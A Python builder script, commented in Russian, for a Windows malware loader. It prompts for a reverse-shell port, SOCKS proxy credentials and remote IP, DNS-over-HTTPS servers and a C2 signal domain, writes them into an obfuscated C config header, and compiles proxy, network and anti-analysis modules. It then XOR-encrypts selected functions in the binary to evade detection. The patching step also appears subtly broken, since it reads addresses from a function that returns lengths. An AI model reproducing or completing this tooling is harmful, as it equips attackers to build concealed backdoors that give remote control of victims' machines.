import os
import re
import sys
import shutil
import struct
import subprocess

CONFIG_H   = "config.h"
BACKUP_H   = "config.h.bak"
MAP_FILE   = "loader.map"
OUT_EXE    = "loader.exe"
PACKED_EXE = "loader_packed.exe"
XOR_KEY    = 0x5A

# Шаблон конфига
TEMPLATE = r'''#ifndef CONFIG_H
#define CONFIG_H

#define RSHELL_PORT            {RSHELL_PORT}

#define SOCKS_LOGIN            AY_OBFUSCATE("{SOCKS_LOGIN}")
#define SOCKS_PASSWORD         AY_OBFUSCATE("{SOCKS_PASSWORD}")
#define SOCKS_REMOTE_IP        AY_OBFUSCATE("{SOCKS_REMOTE_IP}")
#define SOCKS_REMOTE_PORT      {SOCKS_REMOTE_PORT}

#define DOH_COUNT       {DOH_COUNT}

// Адреса серверов
{DOH_DEFINES}

#define DOH_HTTPS_PORT         {DOH_HTTPS_PORT}

#define C2_SIGNAL_DOMAIN       "{C2_DOMAIN}"

#endif /* CONFIG_H */
'''

# Стэк функций которые нужно патчить
FUNCS = [
    "Crypto_DecryptRegion",
    "Crypto_EncryptRegion",
    "Crypto_Invoke"
]

# Регэксп для поиска RVA в .map
FUNC_REGEX = re.compile(
    r"^\s*([0-9A-F]{8})\s+f\s+(\?\?_{name}.*)$".replace("{name}", "|".join(FUNCS)),
    re.IGNORECASE
)

def prompt(txt, default):
    line = input(f"{txt} [{default}]: ").strip()
    return line if line else default

def gen_config():
    print("=== CLI-Builder loader ===")
    defaults = {
        "RSHELL_PORT":      "4444",
        "SOCKS_LOGIN":      "admin",
        "SOCKS_PASSWORD":   "password",
        "SOCKS_REMOTE_IP":  "127.0.0.1",
        "SOCKS_REMOTE_PORT":"1080",
        "DOH_COUNT":        "2",
        "DOH_0":            "cloudflare-dns.com",
        "DOH_1":            "dns.google",
        "DOH_HTTPS_PORT":   "443",
        "C2_DOMAIN":        "signal.example.com",
    }
    cfg = {}
    cfg["RSHELL_PORT"]       = prompt("Reverse shell port", defaults["RSHELL_PORT"])
    cfg["SOCKS_LOGIN"]       = prompt("SOCKS login",     defaults["SOCKS_LOGIN"])
    cfg["SOCKS_PASSWORD"]    = prompt("SOCKS password",  defaults["SOCKS_PASSWORD"])
    cfg["SOCKS_REMOTE_IP"]   = prompt("SOCKS remote IP", defaults["SOCKS_REMOTE_IP"])
    cfg["SOCKS_REMOTE_PORT"] = prompt("SOCKS remote port", defaults["SOCKS_REMOTE_PORT"])
    doh_count = int(prompt("Number of DoH servers", defaults["DOH_COUNT"]))
    cfg["DOH_COUNT"]         = str(doh_count)
    doh_servers = []
    for i in range(doh_count):
        key = f"DOH_{i}"
        val = prompt(f"DoH server #{i}", defaults.get(key, ""))
        doh_servers.append(val)
    cfg["DOH_HTTPS_PORT"]    = prompt("DoH HTTPS port", defaults["DOH_HTTPS_PORT"])
    cfg["C2_DOMAIN"]         = prompt("C2 signal domain", defaults["C2_DOMAIN"])
    cfg["DOH_DEFINES"]       = "\n".join(f'#define DOH_SERVER_{i} "{host}"'
                                        for i, host in enumerate(doh_servers))

    if os.path.exists(CONFIG_H):
        shutil.copyfile(CONFIG_H, BACKUP_H)
        print(f"[+] Backup saved as {BACKUP_H}")
    with open(CONFIG_H, "w", encoding="utf-8") as f:
        f.write(TEMPLATE.format(**cfg))
    print(f"[+] {CONFIG_H} updated\n")

def compile_with_map():
    print("[*] Прекомпил с генерацией .map")
    cmd = [
        "cl", "/EHsc", "/O2", "/MT",
        "main.c", "proxy.c", "net.c", "anti.c", "user.c", "crypto.c",
        "/link", f"/MAP:{MAP_FILE}", f"/OUT:{OUT_EXE}"
    ]
    subprocess.check_call(cmd)
    print(f"[+] Компиляция завершена: {OUT_EXE} + {MAP_FILE}\n")

def parse_map():
    items = []
    with open(MAP_FILE, "r") as f:
        for ln in f:
            m = FUNC_REGEX.match(ln)
            if not m: continue
            rva = int(m.group(1), 16)
            sym = m.group(2)
            for fn in FUNCS:
                if fn in sym:
                    items.append((rva, fn))
    if not items:
        print("ERROR: не нашёл ни одной функции в map")
        sys.exit(1)
    items.sort()
    regions = {}
    for i, (rva, fn) in enumerate(items):
        next_rva = items[i+1][0] if i+1 < len(items) else rva + 0x2000
        regions[fn] = next_rva - rva
    print(f"[+] Parsed regions: {regions}")
    return regions

def patch_sources(regions):
    src = "user.c"
    text = open(src, "r", encoding="utf-8").read()
    pattern = re.compile(
        r'Crypto_Invoke\(\s*(?P<fn>\w+)\s*,\s*/\*LEN\*/\s*,\s*(?P<key>0x[0-9A-Fa-f]+)\s*\)'
    )
    def repl(m):
        fn  = m.group("fn")
        key = m.group("key")
        length = regions.get(fn)
        if length is None:
            print(f"[!] WARNING: длина для {fn} не найдена, /*LEN*/")
            return m.group(0)
        return f"Crypto_Invoke({fn}, 0x{length:X}, {key})"
    new = pattern.sub(repl, text)
    open(src, "w", encoding="utf-8").write(new)
    print(f"[+] Подставлены длины в {src}\n")

def compile_final():
    print("[*] Финальная компиляция без /MAP")
    if os.path.exists(OUT_EXE):
        os.remove(OUT_EXE)
    cmd = [
        "cl", "/EHsc", "/O2", "/MT",
        "main.c", "proxy.c", "net.c", "anti.c", "user.c", "crypto.c",
        "/link", f"/OUT:{OUT_EXE}"
    ]
    subprocess.check_call(cmd)
    print(f"[+] Финальная сборка: {OUT_EXE}\n")

def rva_to_offset(data, rva, sections):
    for name, va, vs, ptr, ps in sections:
        if va <= rva < va + vs:
            return ptr + (rva - va)
    raise ValueError(f"RVA {hex(rva)} не в секциях")

def patch_exe(regions):
    print("[*] Патчим exe ")
    data = bytearray(open(OUT_EXE, "rb").read())

    e_lfanew, = struct.unpack_from("<I", data, 0x3C)
    num_sec,  = struct.unpack_from("<H", data, e_lfanew+6)
    size_opt, = struct.unpack_from("<H", data, e_lfanew+20)
    sec_start = e_lfanew + 24 + size_opt

    sections = []
    off = sec_start
    for _ in range(num_sec):
        name = data[off:off+8].rstrip(b'\x00').decode('ascii', errors='ignore')
        va, vs, ptr, ps = struct.unpack_from("<IIII", data, off+8)
        sections.append((name, va, vs, ptr, ps))
        off += 40

    for fn, length in regions.items():
        rva = next(r for r,f in parse_map().items() if f == fn)
        foa = rva_to_offset(data, rva, sections)
        print(f" - {fn}: FOA={hex(foa)} len={hex(length)}")
        for i in range(length):
            data[foa + i] ^= XOR_KEY

    open(PACKED_EXE, "wb").write(data)
    print(f"[+] Упакованный бинарник: {PACKED_EXE}\n")

def main():
    gen_config()
    compile_with_map()
    regions = parse_map()
    patch_sources(regions)
    compile_final()
    patch_exe(regions)
    print("End")

if __name__ == "__main__":
    main()
